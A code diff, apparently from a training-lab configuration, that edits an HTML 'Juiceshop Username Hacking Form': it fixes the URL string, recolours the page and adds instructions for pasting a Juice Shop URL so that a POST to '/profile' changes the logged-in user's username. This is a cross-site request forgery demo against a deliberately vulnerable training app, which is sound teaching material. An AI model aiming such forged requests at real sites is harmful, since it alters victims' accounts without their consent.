@@ -67,14 +67,14 @@ data:
             if (url.includes("/")) {
                 url = url.substring(0, url.indexOf("/"));
             }
-            url = "https://" + url + "/profile;
+            url = "https://" + url + "/profile";
             alert(url);
             attackForm.action=url;
             attackForm.submit();
         }
     </script>
     
-    <body style="background-color:#303030; font-family: Roboto, Helvetica Neue, sans-serif;">
+    <body style="background-color:#FF6464; font-family: Roboto, Helvetica Neue, sans-serif;">
     
     <h2>Juiceshop Username Hacking Form</h2>
     
@@ -89,7 +89,13 @@ data:
     <p></p>
     <div>
       <h3>Hacking Form - direct Juiceshop</h3>
-      Submit form to hack "username" in Juiceshop
+        <ul>
+            <li>Copy the URL of the Juiceshop tab</li>
+            <li>Paste the Juiceshop URL in the "URL" form field below</li>
+            <li>Then click the "Hack Username" button</li>
+        </ul>
+      <p>
+        After these steps, the username attribute in Juiceshop will have changed to the value below.
       <form id="hackingform" 
             action="empty" 
            method="POST">
